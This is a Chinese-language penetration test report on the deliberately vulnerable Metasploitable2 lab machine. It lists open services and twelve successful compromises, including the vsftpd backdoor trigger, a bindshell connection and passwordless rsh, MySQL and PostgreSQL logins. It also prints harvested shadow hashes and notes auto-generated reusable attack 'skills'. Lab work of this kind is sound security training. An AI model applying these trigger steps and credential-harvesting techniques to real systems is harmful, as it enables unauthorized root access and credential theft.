# Metasploitable2 渗透测试报告

**目标**: 192.168.136.137 (VMware Workstation)
**攻击机**: 192.168.136.143 (Kali Linux, SSH 操控)
**时间**: 2026-06-22
**耗时**: 106 秒 (扫描 32s + 利用 74s)

---

## 发现端口: 30 个

| 端口 | 服务 | 版本 |
|------|------|------|
| 21 | ftp | vsftpd 2.3.4 |
| 22 | ssh | OpenSSH 4.7p1 |
| 23 | telnet | Linux telnetd |
| 25 | smtp | Postfix smtpd |
| 53 | domain | ISC BIND 9.4.2 |
| 80 | http | Apache 2.2.8 |
| 111 | rpcbind | - |
| 139/445 | netbios-ssn | Samba 3.0.20 |
| 512/513/514 | exec/login/rsh | rlogin/rsh |
| 1099 | java-rmi | GNU Classpath |
| 1524 | bindshell | Metasploitable root shell |
| 2049 | rpcbind | NFS |
| 2121 | ftp | ProFTPD 1.3.1 |
| 3306 | mysql | MySQL 5.0.51a |
| 3632 | distccd | distccd v1 |
| 5432 | postgresql | PostgreSQL 8.3 |
| 5900 | vnc | VNC 3.3 |
| 6000 | X11 | (access denied) |
| 6667/6697 | irc | UnrealIRCd |
| 8009 | ajp13 | Apache Jserv |
| 8180 | http | Tomcat/Coyote |
| 8787 | drb | Ruby DRb |

---

## 成功利用: 12 个

### 1. vsftpd 2.3.4 后门 [CVE-2011-2523] — root shell
```
uid=0(root) gid=0(root)
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
```
触发方式: FTP 连接发送 `USER test:)` → 后门监听 6200 端口

### 2. bindshell:1524 — root shell
```
uid=0(root) gid=0(root) groups=0(root)
metasploitable
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
root:x:0:0:root:/root:/bin/bash
```
直接 nc 连接 1524 端口获取 root shell

### 3. rlogin/rsh 无认证 root 访问
```
uid=0(root) gid=0(root) groups=0(root)
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
18:18:02 up 6:13, 1 user
```
rsh -l root 无需密码直接获取 root 权限

### 4. MySQL root 空密码
```
root@192.168.136.143  5.0.51a-3ubuntu5
user      password
debian-sys-maint  (空)
root             (空)
guest            (空)
```
root 无密码直接登录，可读取所有数据库

### 5. PostgreSQL postgres 空密码
```
PostgreSQL 8.3.1
usename   passwd
postgres  md53175bce1d3201d16594cebf9d7eb3f9d
```
postgres 用户无密码登录

### 6. Samba 匿名访问 + 34 个用户枚举
```
Anonymous login successful
Sharename    Type   Comment
print$       Disk   Printer Drivers
tmp          Disk   oh noes!
opt          Disk
IPC$         IPC    IPC Service (Samba 3.0.20)
ADMIN$       IPC    IPC Service (Samba 3.0.20)
```
枚举到 34 个系统用户 (root, msfadmin, postgres, mysql, tomcat55 等)

### 7. NFS 全盘共享 (无限制)
```
Export list: / *    (所有目录对所有人开放)
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
```
可挂载根分区，读取 shadow/passwd/ssh密钥

### 8. Telnet msfadmin:msfadmin
```
uid=1000(msfadmin) gid=1000(msfadmin)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),
44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare)
```
默认凭据登录，属于 admin 组

### 9. Java RMI 反序列化 [CVE-2011-3556]
```
VULNERABLE: RMI registry default configuration remote code execution
State: VULNERABLE
CVSS: 允许从远程URL加载类 → 远程代码执行
```

### 10. distcc 命令执行 [CVE-2004-2687]
```
VULNERABLE: distcc Daemon Command Execution
State: VULNERABLE (Exploitable)
CVSSv2: 9.3 (HIGH) — AV:N/AC:M/Au:N/C:C/I:C/A:C
```

### 11. VNC 无认证 (协议 3.3)
```
RFB 003.003
```
VNC 无密码保护，可直接连接查看桌面

### 12. Tomcat Manager tomcat:tomcat
```
Tomcat Web Application Manager 可访问
已部署应用列表可枚举
```

---

## SMTP 用户枚举 (附加发现)

VRFY 枚举到所有系统用户: backup, bin, daemon, distccd, ftp, games,
gnats, irc, libuuid, list, lp, mail, man, msfadmin, mysql, news, nobody,
postfix, postgres, proftpd, root, service, sshd, sync, sys, syslog,
telnetd, tomcat55, uucp, user, www-data

---

## 获取的凭据

| 服务 | 用户 | 密码 | 权限 |
|------|------|------|------|
| SSH/rsh/rlogin | root | (无认证) | root |
| bindshell:1524 | root | (直接shell) | root |
| vsftpd backdoor | root | (后门shell) | root |
| MySQL | root | (空) | root |
| PostgreSQL | postgres | (空) | postgres |
| Telnet | msfadmin | msfadmin | admin组 |
| Samba | anonymous | (空) | 读共享 |
| NFS | everyone | (无限制) | 读写全盘 |
| Tomcat | tomcat | tomcat | Manager |
| VNC | - | (无认证) | 桌面控制 |

## Shadow Hash (已获取)

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14747:0:99999:7:::
```

---

## 自动生成的 Skills: 26 个

存储在 `skills/learned/auto-*/SKILL.md`，包含:
- 执行命令、耗时、成功/失败状态、证据
- 下次遇到同类服务可直接复用，跳过探测阶段
